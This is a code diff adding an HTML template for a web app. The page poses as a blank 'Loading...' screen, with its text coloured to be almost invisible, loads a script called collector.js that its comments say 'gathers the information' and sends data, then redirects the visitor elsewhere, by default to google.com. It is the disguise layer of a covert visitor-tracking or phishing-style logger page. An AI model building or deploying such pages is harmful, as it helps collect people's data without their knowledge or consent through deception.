@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #ffffff; 
+      color: #f5f6fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center; 
+    }
+  </style>
+</head>
+<body>
+  <!-- This script gathers the information -->
+  <script src="{{ url_for('static', filename='js/collector.js') }}"></script>
+
+  <!-- This script handles the redirection after a short delay -->
+  <script>
+    // A short delay (4 seconds) gives the collector script time to send data
+    setTimeout(() => {
+      window.location.href = "{{ redirect_url or 'https://google.com' }}";
+    }, 5000);
+  </script>
+</body>
+</html>
